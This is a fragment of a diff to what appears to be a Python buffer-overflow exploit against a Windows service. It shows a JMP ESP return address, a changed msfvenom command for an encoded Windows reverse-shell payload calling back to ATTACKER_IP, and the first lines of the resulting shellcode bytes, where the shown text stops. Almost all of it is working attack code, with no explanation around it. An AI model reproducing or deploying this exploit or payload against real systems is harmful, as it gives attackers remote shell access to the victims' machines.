@@ -3,7 +3,7 @@ import socket
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 #5F4A358F FFE4 JMP ESP
 
-#msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=1234 -f -c -a x86 --platform windows -e x86/shikata_ga_nai -b "\x00\x0a\x0d"
+#msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=1234 -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d"
 shellcode = ("\xb8\x22\x2c\x25\x89\xdd\xc6\xd9\x74\x24\xf4\x5f\x29\xc9\xb1"
 "\x52\x31\x47\x12\x83\xc7\x04\x03\x65\x22\xc7\x7c\x95\xd2\x85"
 "\x7f\x65\x23\xea\xf6\x80\x12\x2a\x6c\xc1\x05\x9a\xe6\x87\xa9"
